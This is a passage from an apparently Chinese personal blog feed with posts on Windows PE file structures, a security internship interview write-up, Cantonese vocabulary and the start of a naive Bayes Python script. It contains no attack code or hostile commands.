值。前者指向函数名字符串地址表。这个地址表是一个双字数组，数组中的每一项指向一个函数名称字符串的RVA。数组的项数等于<code>NumberOfNames</code>字段的值，所有有名称的导出函数的名称字符串都定义在这个表中；后者指向另一个word 类型的数组（注意不是双字数组）。数组项目与文件名地址表中的项目一一对应，项目值代表函数入口地址表的索引，这样函数名称与函数入口地址关联起来。</p><p>假如函数名称字符串地址表的第n项指向一个字符串“MyFunction”，那么可以去查找<code>AddressOfNameOrdinals</code>指向的数组的第n项，假如第n项中存放的值是x，则表示<code>AddressOfFunctions</code>字段描述的地址表中的第x项函数入口地址对应的名称就是“MyFunction”。</p></li></ul><img src="/posts/4dec66bb/%E5%AF%BC%E5%87%BA%E8%A1%A8%E7%9B%B8%E4%BA%92%E5%85%B3%E7%B3%BB.png" class="" title="导出表相互关系"><h3 id="※5-4-3-查找函数入口地址"><a href="#※5-4-3-查找函数入口地址" class="headerlink" title="※5.4.3 查找函数入口地址"></a>※5.4.3 查找函数入口地址</h3><h4 id="5-4-3-1-从序号查找函数入口地址"><a href="#5-4-3-1-从序号查找函数入口地址" class="headerlink" title="5.4.3.1 从序号查找函数入口地址"></a>5.4.3.1 从序号查找函数入口地址</h4><p>Windows 装载器的工作步骤如下：</p><ol><li>定位到PE 文件头</li><li>从PE 文件头中的<code>IMAGE_OPTIONAL_HEADER32</code>结构中取出数据目录表，并从第一个数据目录中得到导出表的RVA</li><li>从导出表的<code>Base</code>字段得到起始序号</li><li>将需要查找的导出序号减去起始序号，得到函数在入口地址表中的索引</li><li>检测索引值是否大于导出表的<code>NumberOfFunctions</code>字段的值，如果大于后者的话，说明输入的序号是无效的</li><li>用这个索引值在<code>AddressOfFunctions</code>字段指向的导出函数入口地址表中取出相应的项目，这就是函数入口地址的RVA 值，当函数被装入内存的时候，这个RVA 值加上模块实际装入的基地址，就得到了函数真正的入口地址</li></ol><h4 id="5-4-3-2-从函数名称查找入口地址"><a href="#5-4-3-2-从函数名称查找入口地址" class="headerlink" title="5.4.3.2 从函数名称查找入口地址"></a>5.4.3.2 从函数名称查找入口地址</h4><p>Windows 装载器的工作步骤如下：</p><ol><li>最初的步骤是一样的，那就是首先得到导出表的地址</li><li>从导出表的<code>NumberOfNames</code>字段得到已命名函数的总数，并以这个数字作为循环的次数来构造一个循环</li><li>从<code>AddressOfNames</code>字段指向得到的函数名称地址表的第一项开始，在循环中将每一项定义的函数名与要查找的函数名相比较，如果没有任何一个函数名是符合的，表示文件中没有指定名称的函数</li><li>如果某一项定义的函数名与要查找的函数名符合，那么记下这个函数名在字符串地址表中的索引值，然后在<code>AddressOfNamesOrdinals</code>指向的数组中以同样的索引值取出数组项的值，我们这里假设这个值是x</li><li>最后，以 x 值作为索引值，在<code>AddressOfFunctions</code>字段指向的函数入口地址表中获取的 RVA 就是函数的入口地址</li></ol><p>一般情况下病毒程序就是通过函数名称查找入口地址的，因为病毒程序作为一段额外的代码被附加到可执行文件中的，如果病毒代码中用到某些 API 的话，这些 API 的地址不可能在宿主文件的导出表中为病毒代码准备好。因此只能通过在内存中动态查找的方法来实现获取 API 的地址。</p><p><a href="https://www.bilibili.com/video/BV1us411P7nL?p=10">找到PE文件中输出表的导出函数地址 空降23:05</a></p><h2 id="5-5-基址重定位"><a href="#5-5-基址重定位" class="headerlink" title="5.5 基址重定位"></a>5.5 基址重定位</h2><p>链接器生成一个PE文件时，它会假设程序被装入时使用的默认<code>ImageBase</code>基地址（VC默认EXE基地址00400000h，DLL基地址10000000h），并且会把代码中所有指令中用到的地址都使用默认的基地址（例如程序代码中 push 10001000，就是把10000000h当做了基地址，把push 10001000写入到文件中）。如果一个EXE程序中一个DLL装载时的地址与其它DLL地址发生冲突（因为Windows程序是虚拟地址空间，EXE一般不会有地址冲突，加载DLL时可能会有地址冲突），就需要修改代码中的地址，这时就需要进行基址重定位。</p><p>凡是涉及到直接寻址的指令都需要进行重定位处理，如push 10001000，call 10002000等。假设重定位后的基地址由原来的10000000h变为20000000h，那么push 10001000应该改成push 20001000。</p><p>所以重定位的算法可以总结为：</p><p>重定位后的地址 = 直接寻址指令中的双字地址 + (模块实际装入地址 - 模块建议装入地址)</p><p>在PE文件中，基址重定位表一般放在一个单独的<code>.reloc</code>区，可以通过<code>IMAGE_OPTIONAL_HEADER</code>中的<code>DataDirectory[5]</code>查看基址重定位表的RVA。PE文件的重定位表中保存的就是文件中所有需要进行重定位修正的代码的地址。基址重定位表是由一个个<code>IMAGE_BASE_RELOCATION</code>结构构成的。</p><h3 id="5-5-1-IMAGE-BASE-RELOCATION"><a href="#5-5-1-IMAGE-BASE-RELOCATION" class="headerlink" title="5.5.1 IMAGE_BASE_RELOCATION"></a>5.5.1 IMAGE_BASE_RELOCATION</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BASE_RELOCATION</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfBlock;</span><br><span class="line">    WORD    TypeOffset[];</span><br><span class="line">&#125; IMAGE_BASE_RELOCATION, * PIMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure><ul><li>VirtualAddress：重定位数据开始的RVA地址。</li><li>SizeOfBlock：重定位块的长度。</li><li>TypeOffset[]：一个数组，它的元素个数就是$\frac {SizeOfBlock-8}{2}$，每一个元素占用两个字节(16位)，其中高4位表示重定位类型，低12位表示重定位地址。它与<code>VirtualAddress</code>相加即是指向PE映像中需要修改的地址数据的指针。</li></ul><h2 id="5-6-资源表"><a href="#5-6-资源表" class="headerlink" title="5.6 资源表"></a>5.6 资源表</h2><p>Windows程序的各种界面称为资源，包括加速键、位图、光标、对话框、图标、菜单、串表、工具栏和版本信息等。资源是PE文件中非常重要的部分，几乎所有的PE文件中都包含着资源，与导入表和导出表相比，资源的组织方式要复杂得多。</p><img src="/posts/4dec66bb/%E8%B5%84%E6%BA%90%E6%A0%91%E5%BD%A2%E7%BB%93%E6%9E%84.png" class="" title="资源的树形结构"><p>资源有很多种类型，每种类型的资源中可能存在多个资源项，这些资源项用不同的ID或名称来区分，采取类似于磁盘目录结构的方式保存。从上图可以看到，PE文件中的资源是按照 资源类型 -&gt; 资源ID -&gt; 资源代码页 的3层树型目录结构来组织资源的，通过层层索引才能够进入相应的子目录找到正确的资源。</p><h3 id="5-6-1-资源目录结构"><a href="#5-6-1-资源目录结构" class="headerlink" title="5.6.1 资源目录结构"></a>5.6.1 资源目录结构</h3><p>数据目录表中的<code>IMAGE_DIRECTORY_ENTRY_RESOURCE</code>条目(第三项)包含资源的RVA和大小。资源目录结构中的每一个结点都是由<code>IMAGE_RESOURCE_DIRECTORY</code>结构和紧跟其后的数个<code>IMAGE_RESOURCE_DIRECTORY_ENTRY</code>结构组成的。</p><img src="/posts/4dec66bb/%E8%B5%84%E6%BA%90%E7%9B%AE%E5%BD%95.png" class="" title="资源目录结构"><h3 id="5-6-2-IMAGE-RESOURCE-DIRECTORY"><a href="#5-6-2-IMAGE-RESOURCE-DIRECTORY" class="headerlink" title="5.6.2 IMAGE_RESOURCE_DIRECTORY"></a>5.6.2 IMAGE_RESOURCE_DIRECTORY</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RESOURCE_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    WORD    NumberOfNamedEntries;   <span class="comment">// 用字符串作为资源标识的条目个数</span></span><br><span class="line">    WORD    NumberOfIdEntries;      <span class="comment">// 用数字ID作为资源标识的条目个数</span></span><br><span class="line">&#125; IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;</span><br></pre></td></tr></table></figure><p>唯一要注意的就是<code>NameberOfNamedEntries</code>和<code>NumberOfIdEntries</code>，它们说明了本目录中目录项的数量，两者加起来就是本目录中的目录项总和，也就是后边跟着的<code>IMAGE_RESOURCE_DIRECTORY_ENTRY</code>数目。</p><h3 id="5-6-3-IMAGE-RESOURCE-DIRECTORY-ENTRY"><a href="#5-6-3-IMAGE-RESOURCE-DIRECTORY-ENTRY" class="headerlink" title="5.6.3 IMAGE_RESOURCE_DIRECTORY_ENTRY"></a>5.6.3 IMAGE_RESOURCE_DIRECTORY_ENTRY</h3><p><code>IMAGE_RESOURCE_DIRECTORY_ENTRY</code>紧跟在资源目录结构后，此结构长度为 8 个字节，包含 2 个字段。该结构定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RESOURCE_DIRECTORY_ENTRY</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            DWORD NameOffset:<span class="number">31</span>;<span class="comment">//资源名偏移</span></span><br><span class="line">            DWORD NameIsString:<span class="number">1</span>;<span class="comment">//资源名为字符串</span></span><br><span class="line">        &#125; DUMMYSTRUCTNAME;</span><br><span class="line">        DWORD   Name;<span class="comment">//资源/语言类型</span></span><br><span class="line">        WORD    Id;<span class="comment">//资源数字ID</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;    <span class="comment">// 资源名称</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   OffsetToData;<span class="comment">//数据偏移地址</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            DWORD   OffsetToDirectory:<span class="number">31</span>;<span class="comment">//子目录偏移地址</span></span><br><span class="line">            DWORD   DataIsDirectory:<span class="number">1</span>;<span class="comment">//数据为目录</span></span><br><span class="line">        &#125; DUMMYSTRUCTNAME2;</span><br><span class="line">    &#125; DUMMYUNIONNAME2;   <span class="comment">// 资源位置</span></span><br><span class="line">&#125; IMAGE_RESOURCE_DIRECTORY_ENTRY,*PIMAGE_RESOURCE_DIRECTORY_ENTRY;</span><br></pre></td></tr></table></figure><p>这个结构体在每一层中都是以结构体数组的方式存在，但在每一层的含义都不同：</p><ul><li>第一层，每个元素代表一种资源</li><li>第二层，每个元素代表一个资源</li><li>第三层，每个元素代表一个资源的位置</li></ul><h4 id="5-6-3-1-第一个联合体"><a href="#5-6-3-1-第一个联合体" class="headerlink" title="5.6.3.1 第一个联合体"></a>5.6.3.1 第一个联合体</h4><ul><li>如果最高位为0，也就是<code>NameIsString</code>为0，此时4字节代表资源类型，也就是ID起作用</li></ul><div class="table-container"><table><thead><tr><th>值</th><th>资源类型</th><th>值</th><th>资源类型</th></tr></thead><tbody><tr><td>0x01</td><td>鼠标指针</td><td>0x08</td><td>字体</td></tr><tr><td>0x02</td><td>位图</td><td>0x09</td><td>快捷键</td></tr><tr><td>0x03</td><td>图标</td><td>0x0A</td><td>非格式化资源</td></tr><tr><td>0x04</td><td>菜单</td><td>0x0B</td><td>消息列表</td></tr><tr><td>0x05</td><td>对话框</td><td>0x0C</td><td>鼠标指针组</td></tr><tr><td>0x06</td><td>字符串列表</td><td>0x0E</td><td>图标组</td></tr><tr><td>0x07</td><td>字体目录</td><td>0x0F</td><td>版本信息</td></tr></tbody></table></div><ul><li><p>如果最高位为1，也就是<code>NameIsString</code>为1，这是<code>NameOffset</code>指向保存字符串的结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RESOURCE_DIR_STRING_U</span> &#123;</span></span><br><span class="line">    WORD    Length;<span class="comment">//字符串长度</span></span><br><span class="line">    WCHAR   NameString[<span class="number">1</span>];<span class="comment">//UNICODE字符串</span></span><br><span class="line">&#125;IMAGE_RESOURCE_DIR_STRING_U,*PIMAGE_RESOURCE_DIR_STRING_U;</span><br></pre></td></tr></table></figure></li></ul><p>第二个元素<code>NameString</code>为字符串起始地址，长度为<code>Length</code>，这个串不是以0结尾。</p><h4 id="5-6-3-2-第二个联合体"><a href="#5-6-3-2-第二个联合体" class="headerlink" title="5.6.3.2 第二个联合体"></a>5.6.3.2 第二个联合体</h4><ul><li>如果最高位为1，也就是<code>DataIsDirectory</code>为1，代表<code>OffsetToDirectory</code>指向的地方是一个目录。通常，第一层和第二层，这个值都是1。</li><li>如果最高位为0，也就是<code>DataIsDirectory</code>为0，代表<code>OffsetToDirectory</code>指向的地方是一个数据。通常，第三层，这个值为0。</li></ul><h3 id="5-6-4-IMAGE-RESOURCE-DATA-ENTRY"><a href="#5-6-4-IMAGE-RESOURCE-DATA-ENTRY" class="headerlink" title="5.6.4 IMAGE_RESOURCE_DATA_ENTRY"></a>5.6.4 IMAGE_RESOURCE_DATA_ENTRY</h3><p>这个结构体是第三层指向的，最终资源的结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RESOURCE_DATA_ENTRY</span> &#123;</span></span><br><span class="line">    DWORD   OffsetToData;   <span class="comment">// 资源偏移，RVA</span></span><br><span class="line">    DWORD   Size;           <span class="comment">// 资源大小</span></span><br><span class="line">    DWORD   CodePage;       <span class="comment">// 资源页属性</span></span><br><span class="line">    DWORD   Reserved;</span><br><span class="line">&#125; IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;</span><br></pre></td></tr></table></figure><img src="/posts/4dec66bb/PE%E7%BB%93%E6%9E%84.png" class="" title="PE结构总结">]]></content>
    
    
    <summary type="html">&lt;p&gt;Windows逆向最基础的就是要对PE结构烂熟于心，我之前做了很多题又怎样呢，还是对PE结构一知半解，地基打不好就别梦想盖高楼。知其然知其所以然，千万不要图“快”而忽略一些重要的细节，慢就是快，这也是我这段时间悟出来的道理。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>奇安信暑期实习安全研究员一面凉经</title>
    <link href="http://example.com/posts/61cb3b01.html"/>
    <id>http://example.com/posts/61cb3b01.html</id>
    <published>2022-05-16T00:03:56.760Z</published>
    <updated>2022-06-25T12:36:03.671Z</updated>
    
    <content type="html"><![CDATA[<p>我第一次面试…好尴尬啊一问三不知，技术面试官还能跟我聊50分钟，不，是他问问题问了50分钟，笑死。呜呜呜不过面试官好温柔啊，问了我这么多问题我都不知道，他也没有丝毫不耐烦，dbq我辜负了您的期望，我心里一直在想快结束吧我真的不会！！！而且他还是在加班的时候被我打电话过去说要面试的，那他后面岂不是要加加班，呜呜呜非常抱歉浪费您宝贵的50分钟，我太菜了。还有他给我提供了今后如何学习某个逆向方向的建议，使我整个学习规划都清晰了许多，我真的是非常感谢他~</p><p>废话结束，进入正题。</p><span id="more"></span><p>1.首先自我介绍吧，主要是你在大学里边做了一些什么与安全相关的项目，比较拿得出手的一些项目，其次是你自己的一个技能点，你最擅长做什么事情。</p><p>2.我看你投的是安全研究员软件方向，你期望的工作内容是什么？</p><p>3.你有没有分析过Windows平台下的样本、病毒？</p><p>4.相对虚拟地址(RVA)和文件偏移地址(FOA)间的转换。</p><p><a href="https://bbs.pediy.com/thread-221766.htm">https://bbs.pediy.com/thread-221766.htm</a></p><p>5.代码段具有可读可写可执行中的哪些权限？</p><p>6.IAT(导入地址表)是用来干什么的，导入的具体流程。</p><p>7.在shellcode中动态定位API的过程。</p><p>8.Windows平台病毒样本的类型。</p><p><a href="https://www.docin.com/p-2495525891.html">https://www.docin.com/p-2495525891.html</a></p><p>这个好牛，如果写得不错买它！ <a href="https://blog.csdn.net/eastmount/category_9193519.html">https://blog.csdn.net/eastmount/category_9193519.html</a> </p><p>9.常见的函数调用约定类型有哪些？</p><p><a href="https://baike.baidu.com/item/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/3306047?fr=aladdin">https://baike.baidu.com/item/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/3306047?fr=aladdin</a></p><p>10.函数的返回地址保存在什么位置？</p><p>EBP+4</p><p>11.异常处理机制的具体工作流程。</p><p><a href="https://blog.csdn.net/TCP_321/article/details/121784949">https://blog.csdn.net/TCP_321/article/details/121784949</a></p><p>12.WinDBG要会用。</p><p>13.Windows平台下的hook和注入技术。hook类型有哪些？注入方法有哪些？</p><p>可以跟着这位博主学学 <a href="https://www.cnblogs.com/SunsetR/">https://www.cnblogs.com/SunsetR/</a></p><p>14.您有没有分析过漏洞？(漏洞会比样本更有难度。)</p><p>15.dll劫持了解吗？</p><p>16.有没有去复现过一些漏洞？</p><p><strong>反问环节</strong></p><p>1.安全研究员暑期实习有4个方向，会被分配到想去的那个方向吗？</p><p>答：面试官的组包括漏洞二进制安全、软件安全、网络安全。(如果进了他的组就是做这些了)</p><p>2.在实习期间的主要工作内容？</p><p>答：有三个方向：Web、Windows、Linux。每一个方向都有相应的安全产品的技术研究。比如Windows平台，有360、天勤、火绒，我们的组是基础攻防组，主要去研究这些产品的防护原理，也就是做攻击和防御研究的；其次做漏洞分析，比如这个月微软补丁日出来了，会去研究一下哪些危害比较高的漏洞，写POC或根据已有的POC去把它的漏洞利用(exp)写出来；还有安全技术的研究，比如说exp写出来了，但是只是完成了exp，只是拿到了权限，它并不能做一些真正的恶意操作，这个时候就需要做攻击技术的人去写shellcode，将shellcode加入到exp中，两者结合做一些攻击利用。还有漏洞挖掘的工作，针对Windows平台和Linux平台的浏览器和文档类软件，比如pdf、office软件。</p><p>面：在这次面试中做了哪些准备？</p><p>安全研究岗更偏向于实际的一些东西，动手实践的东西，你能做什么，做了一些什么项目，而不是理论。操作系统、计算机网络更偏向于开发岗。</p><p>我：怎么去学习？</p><p>答：对于Windows平台，最基础的，CTF是一个很好的跳板，更好的练习方法就是实际去做一个样本的分析。Windows平台不管是做漏洞还是做威胁情报还是病毒分析，最核心的一点的就是，他们所有都是PE文件，所以要对PE文件结构非常熟悉，其次是Windows平台下的hook和注入技术，不管是安全软件还是病毒，都会大量使用到。更高阶的，做漏洞分析。比如office的漏洞、浏览器的漏洞、提权的漏洞。通过做病毒分析，可以把上面基础的东西用到，那这些基础知识自然就知道了。hook技术如何检测虚拟机、反调试、脱壳、内存解密、执行。特别是那种APT病毒，挖矿、勒索，分析很多这种，那些知识你都可以掌握得到。所以如果你想从Windows平台去入门，一定要从实战去做，边操作边学习。通过分析大量病毒样本，对于病毒的加解密、遍历文件，同时也要去考虑安全软件如何去防护这些病毒的。当你对Windows平台的基础比较了解的时候，那么你就可以开始做一些更高阶的，比如说漏洞利用的研究，uaf注入类型的漏洞、栈溢出、堆溢出等等。比较流行的勒索，有报告的，可以参考报告去看，一步一步自己手动分析出来。每家安全公司都有威胁安全情报中心，比如奇安信、360、深信服，可以去看他们的报告，自己去做分析。</p><p>奇安信安全岗主要职责：漏洞研究、APT样本研究、攻击利用手法研究、安全产品漏洞研究</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;我第一次面试…好尴尬啊一问三不知，技术面试官还能跟我聊50分钟，不，是他问问题问了50分钟，笑死。呜呜呜不过面试官好温柔啊，问了我这么多问题我都不知道，他也没有丝毫不耐烦，dbq我辜负了您的期望，我心里一直在想快结束吧我真的不会！！！而且他还是在加班的时候被我打电话过去说要面试的，那他后面岂不是要加加班，呜呜呜非常抱歉浪费您宝贵的50分钟，我太菜了。还有他给我提供了今后如何学习某个逆向方向的建议，使我整个学习规划都清晰了许多，我真的是非常感谢他~&lt;/p&gt;
&lt;p&gt;废话结束，进入正题。&lt;/p&gt;</summary>
    
    
    
    <category term="往社畜方向前进" scheme="http://example.com/categories/%E5%BE%80%E7%A4%BE%E7%95%9C%E6%96%B9%E5%90%91%E5%89%8D%E8%BF%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>粤语正字</title>
    <link href="http://example.com/posts/f9ece6c7.html"/>
    <id>http://example.com/posts/f9ece6c7.html</id>
    <published>2022-05-13T04:47:28.320Z</published>
    <updated>2022-05-15T13:44:05.257Z</updated>
    
    <content type="html"><![CDATA[<p>让我看看是哪个广东人不会写粤语的？！是我。</p><span id="more"></span><p>攞(luo)：拿。</p><p>抌(dan)：抌心口、抌章、抌垃圾。</p><p>掟(ding/zheng)：掟手榴弹、掟石仔。</p><p>𢫕：甩。𢫕水。</p><p>㨃(dui)：捅。㨃佢。</p><p>打㰇(jian)：插队。</p><p>唔𠸎(na)耕：冇𠸎㨢，两者之间没有关系。</p><p>无𠸎𠸎：无端端，无缘无故。</p><p>冇(厘)搭霎：做事粗心大意，马马虎虎。</p><p>发𤷪𤺧：脾气变得暴躁。</p><p>发吽(ou)哣(tou)：发呆。</p><p>发烂鲊(zha)：蛮横，不讲理。</p><p>黐(chi)线：原意指电话线路黐在一起，不知道对方在说什么。</p><p>君真：做事认真。</p><p>心抱：媳妇。</p><p>巢皮：洗澡洗很久手指皮都皱了。</p><p>猜呈寻：石头剪刀布。</p><p>掬气：生气。</p><p>便：出便，外便，呢便，嗰(ge)便。</p><p>禁：经受住；耐。好禁睇，好禁计。</p><p>论尽：做事常出毛病，麻烦，累赘。</p><p>咪摸：做事慢，磨蹭。</p><p>吞pork：偷懒。</p><p>cut电话：挂电话。</p><p>card片：卡片。</p><p>搭lift：搭电梯。</p><p>买fare：买票。</p><p>shirt衫：衬衫。</p><p>laine衫：毛衣。laine(法语，羊毛的意思)。</p><p>平靓正：又好又便宜。</p><p>𢫏：𢫏被，𢫏盖，兜巴𢫏你。(用手掌从上往下打)</p><p>升：兜巴升你。(用力向上猛击)</p><p>揿(qin)：按，摁。揿钉，揿掣(che)，揿住佢。</p><p>特登：故意，特意。</p><p>求其：随便。</p><p>是但：随便。</p><p>流嘢：朱义盛(以前广州的一家金铺，专卖仿金首饰)。质量差，虚假的。</p><p>咧啡：吊儿郎当，衣冠不整，不修边幅。</p><p>孤寒：吝啬。风吹皇帝裤浪——孤寒。</p><p>傑(jie)：稠，浓。粥好傑。傑嘢：重大事件。</p><p>架罉(cheng)：工具。</p><p>搦(nuo)：搦部手机过嚟。</p><p>擗(pi)：扔，丢弃。擗嘢。擗炮唔捞。</p><p>景轰：蛊惑。肯定有景轰。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;让我看看是哪个广东人不会写粤语的？！是我。&lt;/p&gt;</summary>
    
    
    
    <category term="长知识了" scheme="http://example.com/categories/%E9%95%BF%E7%9F%A5%E8%AF%86%E4%BA%86/"/>
    
    
  </entry>
  
  <entry>
    <title>朴素贝叶斯算法</title>
    <link href="http://example.com/posts/ea9b7d09.html"/>
    <id>http://example.com/posts/ea9b7d09.html</id>
    <published>2022-05-13T04:32:17.026Z</published>
    <updated>2022-05-13T05:25:57.800Z</updated>
    
    <content type="html"><![CDATA[<p>做的时候很痛苦，但完全是自己写出来的算法真的很有成就感呜呜呜！感谢简博士清晰易懂的例题讲解，让我懂得它的原理。</p><p>经过这个算法我也清楚了Python列表与字典该在哪种情况下使用哪个，非常不错~</p><span id="more"></span><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CreateData</span>():</span><br><span class="line">    sampleset = [[<span class="string">&#x27;青绿&#x27;</span>,<span class="string">&#x27;蜷缩&#x27;</span>,<span class="string">&#x27;浊响&#x27;</span>,<span class="string">&#x27;清晰&#x27;</span>,<span class="string">&#x27;凹陷&#x27;</span>,<span class="string">&#x27;硬滑&#x27;</span>,<span class="string">&#x27;是&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;乌黑&#x27;</span>,<span class="string">&#x27;蜷缩&#x27;</span>,<span class="string">&#x27;沉闷&#x27;</span>,<span class="string">&#x27;清晰&#x27;</span>,<span class="string">&#x27;凹陷&#x27;</span>,<span class="string">&#x27;硬滑&#x27;</span>,<span class="string">&#x27;是&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;乌黑&#x27;</span>,<span class="string">&#x27;蜷缩&#x27;</span>,<span class="string">&#x27;浊响&#x27;</span>,<span class="string">&#x27;清晰&#x27;</span>,<span class="string">&#x27;凹陷&#x27;</span>,<span class="string">&#x27;硬滑&#x27;</span>,<span class="string">&#x27;是&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;青绿&#x27;</span>,<span class="string">&#x27;蜷缩&#x27;</span>,<span class="string">&#x27;沉闷&#x27;</span>,<span class="string">&#x27;清晰&#x27;</span>,<span class="string">&#x27;凹陷&#x27;</span>,<span class="string">&#x27;硬滑&#x27;</span>,<span 